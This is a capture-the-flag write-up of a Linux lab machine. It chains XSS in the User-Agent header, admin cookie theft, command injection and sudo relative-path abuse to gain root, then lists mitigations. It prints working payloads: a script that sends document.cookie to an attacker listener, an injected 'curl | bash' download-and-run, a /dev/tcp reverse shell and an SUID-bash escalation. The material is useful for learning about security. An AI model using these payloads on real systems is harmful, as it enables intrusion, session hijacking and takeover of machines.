## Summary

An *easy* Linux machine focused on web security. The full chain:

1. **Reflected XSS** in the `User-Agent` header, rendered in the admin's internal panel.
2. **Cookie theft** of the admin's session (`document.cookie`, no `HttpOnly` flag).
3. **Command injection** in the admin dashboard form → RCE.
4. **Privesc to root** via a `sudo` binary that runs a script by relative path.

## Reconnaissance

### Port scan

```bash
nmap -sC -sV -p- --min-rate 5000 10.129.85.97
```

Two open ports:

| Port | Service | Detail |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH |
| 5000/tcp | HTTP | Werkzeug httpd 2.2.2 (Python 3.11.2) |

<Callout type="tip">
A basic scan labelled 5000 as `upnp`. That's a **guess** based on `nmap-services`, not a real detection. The `-sV` confirmed it's **Werkzeug** — **Flask**'s development server. Rule: the service name in a scan without fingerprinting is a hypothesis, not a fact.
</Callout>

### The signed cookie

Browsing the site (`/support`), the browser receives a cookie with Flask's characteristic format:

```
is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
```

Decoding the first part:

```bash
echo 'InVzZXIi' | base64 -d
# "user"
```

It's a JSON value (`"user"`) followed by an **HMAC signature**. Changing `"user"` to `"admin"` doesn't work: the server recomputes the signature with a *secret key* we don't know, so a tampered cookie is rejected. **It can't be forged without the key** → we have to steal an already-signed cookie.

## Foothold

### XSS in the User-Agent

The `/support` form detects suspicious characters in the body and responds with a *"Hacking Attempt Detected"*, including this notice:

> a report with your browser information has been sent to the administrators for investigation.

The "browser information" is the `User-Agent` header, which an administrator reviews in an internal panel. Since we fully control that value and it's rendered without sanitisation, we have a **stored/reflected XSS** in the admin context.

**Confirmation** with our own listener:

```bash
python3 -m http.server 8000
```

Request to `/support` with the modified `User-Agent`:

```http
User-Agent: <img src="http://10.10.14.52:8000/xss_test">
```

A few seconds later, the admin bot opens the report and the browser loads the "image":

```
10.129.85.97 - - "GET /xss_test HTTP/1.1" 404 -
```

XSS confirmed: content execution in the administrator's browser.

### Stealing the admin cookie

The cookie has no `HttpOnly` flag (verified in DevTools → Storage → Cookies), so `document.cookie` can read it. Payload in the `User-Agent`:

```html
<script>new Image().src="http://10.10.14.52:8000/?c="+document.cookie;</script>
```

The admin's browser hands over its own signed cookie:

```
GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

```bash
echo 'ImFkbWluIg' | base64 -d
# "admin"
```

<Callout type="note">
The signature `dmzDkZNEm6CK0oyL1fbM-SnXpH0` is valid because the server itself computed it. The attack sidesteps the *secret key* problem: instead of signing ourselves, we let the admin hand us an already-signed cookie.
</Callout>

### Dashboard access

Replacing the cookie with the admin's grants access to a protected route found by fuzzing:

```
GET /dashboard
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

The panel ("Administrator Dashboard") offers a *"Generate a website health report"* with a date field.

### Command injection → RCE

The "health report" runs system commands with the date as input, without sanitising it. Chaining with `;`:

```
date=2023-09-15; curl http://10.10.14.52:8000/rce
```

(url-encoded when sent). The callback shows up in the listener → **RCE confirmed**.

For an interactive shell, a `shell.sh` is served and run from the pipe:

```bash
# shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.52/4444 0>&1
```

```
date=2023-09-15; curl http://10.10.14.52:8000/shell.sh | bash
```

```bash
nc -lvnp 4444
# incoming connection as user dvir
```

`user.txt` is readable by `dvir`.

## Privilege escalation

### sudo enumeration

```bash
sudo -l
```

```
User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

`syscheck` is a readable custom script:

```bash
cat /usr/bin/syscheck
```

Every utility is invoked with an **absolute path** (`/usr/bin/find`, `/usr/bin/df`...), except one line at the end:

```bash
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
fi
```

### Relative-path abuse

`./initdb.sh` runs **as root** (the script runs via sudo) and **from the current working directory**, not from a fixed path. We control that file:

```bash
cd ~
cat > initdb.sh <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x initdb.sh

sudo /usr/bin/syscheck
```

The script sets the **SUID** bit on `/bin/bash` with root permissions:

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash

/bin/bash -p
id
# euid=0(root)
```

<Callout type="warning">
The `-p` flag is essential: without it, bash drops the elevated EUID at startup and you get an unprivileged shell. With `-p` it keeps the root EUID.
</Callout>

`root.txt` captured. ✅

## Lessons and mitigations

| Link | Mitigation |
|---------|------------|
| XSS in User-Agent | Sanitise/escape all input reflected in the admin panel |
| Cookie theft | `HttpOnly` (and `SameSite`) flag on the session cookie |
| Command injection | Don't pass user input to the shell; use APIs/argument lists |
| Relative path in root script | Invoke `initdb.sh` by **absolute path** — a single change hardens it |
